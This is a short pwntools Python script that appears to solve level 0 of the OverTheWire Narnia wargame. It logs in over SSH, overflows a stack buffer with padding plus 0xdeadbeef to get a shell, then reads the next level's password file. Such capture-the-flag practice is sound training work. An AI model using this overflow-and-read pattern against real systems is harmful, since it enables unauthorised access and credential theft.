from pwn import *

# prep work
user = 'narnia0'
shell = ssh(user, 'narnia.labs.overthewire.org', 22, 'narnia0')
sh = shell.run('/narnia/{}'.format(user))
sh.recv()

# exploit
pad = 'C'*20
db  = p32(0xdeadbeef)
exp = pad + db
sh.sendline(exp)
sh.recvuntil('$ ')

# password
sh.sendline("cat /etc/narnia_pass/narnia1")
log.success(sh.recvuntil('\n'))